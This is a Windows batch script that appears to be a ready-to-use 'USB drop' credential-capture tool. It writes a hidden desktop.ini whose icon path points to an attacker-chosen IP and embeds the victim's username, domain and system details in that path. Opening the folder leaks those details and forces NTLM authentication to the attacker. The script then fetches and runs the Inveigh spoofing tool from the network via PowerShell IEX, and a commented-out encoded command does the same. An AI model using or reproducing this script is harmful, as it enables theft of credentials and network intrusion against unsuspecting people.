@echo off
set/p "ip=Enter IP (e.g: 192.168.56.1): "
set/p "tokenc=Enter any comment (e.g: From USB Dropped Outside.. ): "
set a=%%
SET /A randm=%RANDOM%
mkdir Output-%randm%
cd Output-%randm%
mkdir pics
cd pics
echo [.ShellClassInfo] >> desktop.ini
echo IconResource=\\%ip%\%a%USERNAME%a%@%a%USERDOMAIN%a%@%a%PROCESSOR_ARCHITECTURE%a%@%a%NUMBER_OF_PROCESSORS%a%.%tokenc%.ico>> desktop.ini
attrib +s +h desktop.ini
cd ..
attrib +s pics
cd ..
echo .
echo desktop.ini with IP %ip%, written to Output-%randm%/pics/desktop.ini
echo .
timeout 2
echo .
If Not Exist Output (mkdir Output)
powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1\"); Invoke-Inveigh -ConsoleOutput Y -NBNS Y -FileOutput Y -FileOutputDirectory \"Output\""
:: powershell.exe -encodedCommand SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABJAG4AdgBlAGkAZwBoAC4AcABzADEAOwAgAEkAbgB2AG8AawBlAC0ASQBuAHYAZQBpAGcAaAAgAC0AQwBvAG4AcwBvAGwAZQBPAHUAdABwAHUAdAAgAFkAIAAtAE4AQgBOAFMAIABZACAALQBtAEQATgBTACAAWQAgAC0ASABUAFQAUABTACAAWQAgAC0ARgBpAGwAZQBPAHUAdABwAHUAdAAgAFkAIAAtAEYAaQBsAGUATwB1AHQAcAB1AHQARABpAHIAZQBjAHQAbwByAHkAIAAiAE8AdQB0AHAAdQB0ACIAIAAtAFIAdQBuAFQAaQBtAGUAIAA1AA==
pause
